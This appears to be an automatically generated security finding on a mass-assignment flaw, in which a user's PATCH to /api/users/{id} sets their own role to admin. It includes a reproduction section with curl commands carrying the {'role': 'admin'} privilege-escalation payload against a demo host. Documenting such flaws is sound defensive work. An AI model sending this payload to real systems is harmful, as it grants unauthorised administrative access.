# Mass Assignment / BOPLA — privileged field overwrite

**Finding ID:** `AP-924AF48D`  
**Severity:** Critical  
**Impact class:** Privilege Escalation / Broken Property-Level Authorization  
**Effect-class:** `OWNERSHIP`  
**Endpoint:** `PATCH /api/users/{id}`  
**Classification source:** contract

## Summary
The action violates the conservation law **OWNERSHIP: privileged field is server-authoritative**, which is true by the definition of the `OWNERSHIP` effect-class. The violation was **confirmed by proven Δstate**, not a status-code diff.

## Causal path (proof)
1. Principal 'B' issued PATCH /api/users/B and received 200.
2. EIL law violated → OWNERSHIP: privileged field is server-authoritative: client-supplied privileged field 'role=admin' was accepted and reflected by the server (server-authoritative field mutated via client input)
3. Confirmed by Δstate via authenticated read-back of the mutated field: BEFORE ['role' was server-authoritative] → AFTER ['role' = 'admin' set via client-supplied input] (read back as 'B').

## Proof of Δstate
```
method : authenticated read-back of the mutated field
before : 'role' was server-authoritative
after  : 'role' = 'admin' set via client-supplied input
read as: B
detail : privileged field persisted to the server-side object state
```

## Reproduction (PoC)
1. As 'B', send: PATCH /api/users/B with body {"role": "admin"}
2. Observe the privileged effect succeed (200).
3. As the legitimate owner 'B', read the state back to confirm the change/leak persisted.

```bash
curl -X PATCH 'https://demo.local/api/users/B' -H 'Authorization: Bearer $TOKEN_B' -H 'Content-Type: application/json' -d '{"role": "admin"}'
curl -X GET 'https://demo.local/api/users/B' -H 'Authorization: Bearer $TOKEN_B'
```

> Replace $TOKEN_<pid> with each principal's session credential. Run only within authorised program scope.

## Impact
Privilege Escalation / Broken Property-Level Authorization.
